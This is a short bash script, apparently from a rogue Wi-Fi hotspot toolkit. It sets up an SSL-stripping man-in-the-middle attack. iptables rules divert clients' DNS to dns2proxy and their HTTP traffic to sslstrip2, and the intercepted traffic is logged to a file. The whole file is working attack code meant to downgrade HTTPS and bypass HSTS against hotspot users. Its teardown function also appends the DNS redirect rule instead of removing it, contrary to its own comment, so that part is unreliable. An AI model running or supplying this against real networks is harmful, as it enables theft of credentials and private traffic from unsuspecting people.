#!/bin/bash
# Author: MaMe82


SCRIPTPATH="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd)"

source $SCRIPTPATH/setup.conf
NOW=$(date +"%F_%H_%M")
LOGPREFIX=$LOGDIR/${NOW}_


function enable_sslstrip()
{
	# Replace Target-IP of arriving DNS-Packets by the IP of Hotspot-Interface, thus that they are rooted to this interface
	# dns-requests get handled by dns2proxy
	iptables -t nat -A PREROUTING -i $interface_hotspot -p udp --dport 53 -j DNAT --to $interface_hotspot_ip
	#start dns2proxy on interface_hotspot (sslstrip should be started before, to allow dns2proxy to revert hsts changes)
	
	echo "Start dns2proxy for sslstrip"
	python $SCRIPTPATH/dns2proxy/dns2proxy_no_debug.py $interface_hotspot $LOGDIR > /dev/null&
	#python dns2proxy_no_debug.py $interface_hotspot&
	##########
	# sslstrip (with hsts bypass, dns2proxy needed to revert changes)
	# works only if the user starts with a non https entry-point
	##########
	# python sslstrip.py -l 10000 -a -w ${LOGPREFIX}sslstrip.log&
	echo "Start sslstrip for sslstrip"
	python $SCRIPTPATH/sslstrip2/sslstrip.py -w ${LOGPREFIX}sslstrip.log 2>&1 > /dev/null&

	#iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	#iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp ! -d $interface_hotspot_ip -port 80 -j REDIRECT --to-port 10000
	iptables -t nat -A PREROUTING -i $interface_hotspot -p tcp ! -d $interface_hotspot_ip --destination-port 80 -j REDIRECT --to-port 10000

	
	# In case CP is enable, a rule is present which allows forwarding DNS, which we delete
	iptables -t filter -D FORWARD -m mark --mark 99  -p udp --dport 53 -j ACCEPT
}

function disable_sslstrip()
{
	# allow DNS to pass CP
	iptables -t filter -I FORWARD -m mark --mark 99  -p udp --dport 53 -j ACCEPT
	
	# delete REDIRECT rule for HTTP traffic
	iptables -t nat -D PREROUTING -i $interface_hotspot -p tcp ! -d $interface_hotspot_ip --destination-port 80 -j REDIRECT --to-port 10000

	# don't redirect DNS to our host anymore
	iptables -t nat -A PREROUTING -i $interface_hotspot -p udp --dport 53 -j DNAT --to $interface_hotspot_ip

	# kill unneeded procs
	kill $(ps -aux | grep sslstrip.py | grep -v -e grep | awk '{print $2}') 2> /dev/null
	kill $(ps -aux | grep dns2proxy_no_debug.py | grep -v -e grep | awk '{print $2}') 2> /dev/null
}

enable_sslstrip
echo "SSLStrip running ... ENTER to kill"
read
disable_sslstrip
